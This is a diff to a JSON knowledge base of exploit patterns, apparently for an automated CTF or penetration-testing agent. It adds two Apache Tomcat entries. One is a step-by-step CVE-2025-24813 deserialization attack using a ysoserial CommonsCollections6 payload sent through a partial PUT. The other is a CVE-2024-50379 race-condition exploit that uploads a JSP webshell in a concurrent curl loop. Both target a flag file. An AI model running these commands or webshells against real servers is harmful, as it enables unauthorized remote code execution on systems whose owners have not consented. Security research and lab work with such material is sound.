@@ -146,5 +146,38 @@
     "indicators": ["JWT token", "HS256 algorithm", "FastAPI/Swagger docs", "Hardcoded SECRET_KEY in source if visible"],
     "tags": ["authentication", "jwt", "token-forging", "web", "fastapi"],
     "confidence": 0.55
+  },
+  {
+    "id": "tomcat-deserialization-rce",
+    "type": "ExploitPattern",
+    "category": "EXPLOIT",
+    "title": "Apache Tomcat Deserialization RCE — PUT Partial Session Exploit (CVE-2025-24813)",
+    "description": "Tomcat 9.0.x with read-only JMX disabled (default) allows PUT requests to store serialized session files via PersistentManager FileStore. Attack: (1) Probe Tomcat version: curl -s TARGET:PORT/ | grep -i tomcat — look for 9.0.98. (2) Check for read-only disabled by testing PUT: curl -X PUT TARGET:PORT/test.txt -d 'test'. (3) Create ysoserial payload for commons-collections-3.2.1: java -jar ysoserial.jar CommonsCollections6 'cat /opt/flag.txt > /tmp/out' > payload.ser. (4) Send partial PUT to store session file: curl -X PUT TARGET:PORT/session -H 'Content-Range: bytes 0-1000/1001' --data-binary @payload.ser. (5) Trigger deserialization by accessing session: curl TARGET:PORT/ -H 'Cookie: JSESSIONID=.XXXXX'. (6) Read command output: curl TARGET:PORT/cmd?c=cat+/opt/flag.txt.",
+    "techniques": [
+      "Probe: curl -s TARGET:PORT/ | grep -i tomcat",
+      "Test PUT: curl -X PUT TARGET:PORT/test.txt -d 'test'",
+      "Generate payload: java -jar ysoserial.jar CommonsCollections6 'CMD' > payload.ser",
+      "Partial PUT: curl -X PUT TARGET:PORT/session -H 'Content-Range: bytes 0-1000/1001' --data-binary @payload.ser",
+      "Trigger: curl TARGET:PORT/ -H 'Cookie: JSESSIONID=.XXXXX'",
+      "Read output: curl TARGET:PORT/cmd?c=cat+/opt/flag.txt"
+    ],
+    "indicators": ["Tomcat 9.0.x server header", "read-only JMX disabled (PUT requests work)", "commons-collections library available", "Port 10101 or similar exposed"],
+    "tags": ["tomcat", "deserialization", "rce", "CVE-2025-24813", "ysoserial", "java", "put-method", "persistent-manager"],
+    "confidence": 0.85
+  },
+  {
+    "id": "tomcat-race-condition-rce",
+    "type": "ExploitPattern",
+    "category": "EXPLOIT",
+    "title": "Apache Tomcat Race Condition RCE — JSP Upload Concurrent Compilation (CVE-2024-50379)",
+    "description": "Tomcat 9.0.97 has a race condition where PUT validation and JSP compilation happen concurrently. Attack: (1) Probe Tomcat version — look for 9.0.97. (2) Send concurrent PUT requests: upload a .jsp webshell while simultaneously requesting it before validation completes. (3) Use shell to read flag file. (4) The race window is small — send 50-100 concurrent requests.",
+    "techniques": [
+      "Probe: curl -s TARGET:PORT/ | grep -i tomcat",
+      "Race exploit: for i in $(seq 1 100); do curl -X PUT TARGET:PORT/shell.jsp -d '<% Runtime.getRuntime().exec(\"cat /opt/flag.txt\") %>' & curl TARGET:PORT/shell.jsp & done; wait",
+      "Create JSP webshell file and upload with concurrent GET requests during PUT"
+    ],
+    "indicators": ["Tomcat 9.0.97 server header", "PUT method allowed", "JSP compilation enabled"],
+    "tags": ["tomcat", "race-condition", "rce", "CVE-2024-50379", "jsp", "put-method", "concurrent-requests"],
+    "confidence": 0.8
   }
 ]
